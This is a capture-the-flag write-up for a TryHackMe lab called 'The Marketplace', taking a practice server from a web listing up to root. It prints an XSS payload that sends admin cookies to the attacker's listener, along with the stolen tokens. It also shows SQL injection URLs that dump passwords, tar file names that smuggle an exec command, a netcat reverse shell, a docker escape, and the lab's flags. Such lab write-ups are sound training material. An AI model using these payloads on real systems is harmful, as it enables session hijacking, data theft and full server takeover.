
# The Marketplace

**Challenge Description:** The sysadmin of **The Marketplace**, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

---

First started by doing a nmap scan of my target

```
nmap 10.10.138.5 -p- -T4
```

And we get the following

```
Nmap scan report for 10.10.138.5
Host is up (0.38s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
32768/tcp open  filenet-tms
```

So we have SSH running and a Web server. Port 32768 is also a web server and I found out by just connection to it via Netcat

```
$ nc 10.10.138.5 32768
```

```
help
HTTP/1.1 400 Bad Request
Connection: close
```

Taking a look at the web page we land here
![image1.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image1.png)

It's a marketplace website hence the challenge name. I also looked at the other port 32768 and they are serving the same content 

I first took a look to see if there was a `/robots.txt` and luckily there was and  it returned the following

```
User-Agent: *
Disallow: /admin
```

If you try to visit the `/admin` page you will a status back saying your not authorized to do so. So are goal is to get admin access.

At the home page you will see we can make sign up for a account

![image2.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image2.png)

Here is the sign up page. I tried doing some basic SQLi test but none did not work. So I just made a normal user account "0x2B" with a password of "123"

The login page is identical but just logging in. I also tried so SQLi test here but nothing worked so I moved on.

When I logged I took a look at my cookies and saw I had a login token I took note of that
![image4.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image4.png)

Since we are logged in we can now make new listings on the marketplace website

![image3.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image3.png)

I put some random stuff for my item and submitted it

![image5.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image5.png)

One interesting thing you can do is report a listing. So I tried that. When you do that you are taken to a page saying a admin will evaluate the report

![image6.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image6.png)

If you wait a bit longer you get this message

![image7.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image7.png)

So admin visits the listing page. So I thought a XSS attack would perfect so I could steal a admin's login token. I went back to the page where you make a listing and put my XSS payload in the listing's title and description just be extra sure

My payload is the following
```html
<script>fetch("http://10.2.4.176:8000/" + document.cookie)</script>
```
![image8.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image8.png)

The IP there is my own that is hosting a simple python http server using
```
python -m http.server
```

I submitted the item and knew my payload have worked because when I visit the page I get the following
![image9.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image9.png)

And I got a request to my listening web server
```
10.2.4.176 - - [08/Jul/2025 19:10:48] "GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiMHgyQiIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzUyMDE1NDk0fQ.wmwACXG-PFvR3Qm6OlAWs7ar2sI4sySqqa49k9pgQYE HTTP/1.1" 404 -
```

I then reported the listing and after a second I got a request
```
10.10.138.5 - - [08/Jul/2025 19:12:26] "GET /token=`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NTIwMTYzNDV9.I9cvVPWDhEynxv1KsLRTMIOkhUI3MA40G6uAoczlMlQ` HTTP/1.1" 404 -
```

I took that token and put it in my cookies and went to the home page and saw I now have access to a administration panel

![image10.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image10.png)

Going in there you will find your first flag! You will also find all the user accounts on the website

![image11.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image11.png)

If you click one of the boxes it will give you details of that user on a different page
![image12.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image12.png)

I took a look at the URL and saw there was a parameter
http://10.10.138.5/admin?user=1

I knew it had to be doing some sort of SQL query to fetch the user. So I tried doing some SQLi detection. By replacing the 1 with just a `;` you get to see a MySQL error

![image13.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image13.png)

Perfect we can do some SQLi here. Since we know the page displays output from the query we can do a UNION based attack. With some testing this payload satisifes the query without producing any errors
http://10.10.138.5/admin?user=1000%20UNION%20SELECT%201,2,3,4;

Time to enumerate some tables

This following payload leaks all database names
http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20group_concat(schema_name),2,3,4%20FROM%20information_schema.schemata%20;

![image14.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image14.png)

We need to target the `marketplace` database. By using this payload we get all the tables in the marketplace database
http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27;

![image15.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image15.png)

The `users` table caught my interest so I used this next payload to leak its column names

`user=1000%20UNION%20SELECT%20group_concat(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27;`

![image16.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image16.png)

I tried leaking passwords and I was able to do so with this payload

```
http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20username,password,3,4%20FROM%20users%20WHERE%20id=2;
```

![image17.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image17.png)

I then made sure to also look at the messages table to see if any of the other admins had any secret messages they had. Finally I used this payload

```
http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20message_content,user_to,5,4%20%20FROM%20messages;
```

And this gave me the very first message in the messages table

![image18.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image18.png)

Great we have a SSH password and this message was going to a user with the ID of 3 so that would be jake according to the admin panel so lets login as him

Once your in the user flag is obtainable
```
jake@the-marketplace:~$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
jake@the-marketplace:~$ 
```

Now we need to do some privilege esculation. I first started by running `sudo -l` and got this

```
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

From this we know we can run the script located at `/opt/backups/backup.sh` as michael. Lets take out what the script contains

```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

This simple script backups all files in the current directory using a wildcard. This makes the program vulnerable as we can inject arguments into tar by creating files with the name of the arguments we want to run. You can read about that kind of attack [here](https://gtfobins.github.io/gtfobins/tar/)

According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) we can take advantage of the arguments `--checkpoint` and `--chechpoint-action=exec` so I did the following command

```
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh script.sh"
```

Then I made a script called `script.sh` with a basic reverse shell

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.63.55 7878 >/tmp/f" > script.sh
```

Started a netcat listener on my local machine and finally executed `sudo -l michael ./backup.sh`

```
➜  ~ nc -lvnp 7878
Connection from 10.10.189.205:46924
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
$ 
```

Great now we are logged in as michael and something already interesting we can see here is that he is part of the docker group. Which means he can run docker commands with root privileges. Perfect lets try to spawn a interactive shell using docker. GTFOBins has a command here we can run

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Though that command will not work as it will say it must be executed from a tty. We are using a reverse shell so we need to trick it into thinking we are on a tty. We can do this by running this command

```
python -c "import pty;pty.spawn('/bin/bash')"
```

Great now run the docker command.

```
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# 
```

Great now we are root and we can get the root flag

```
# cat /root/root.txt
cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
# 
```
